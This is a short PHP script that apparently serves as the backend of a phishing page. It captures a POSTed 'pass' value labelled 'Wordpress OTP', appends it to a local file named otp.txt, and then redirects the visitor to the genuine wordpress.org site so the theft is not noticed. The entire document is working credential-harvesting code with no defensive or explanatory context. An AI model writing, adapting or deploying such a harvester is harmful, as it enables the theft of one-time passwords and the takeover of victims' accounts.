<?php
file_put_contents("otp.txt", "Wordpress OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://wordpress.org/');
?>
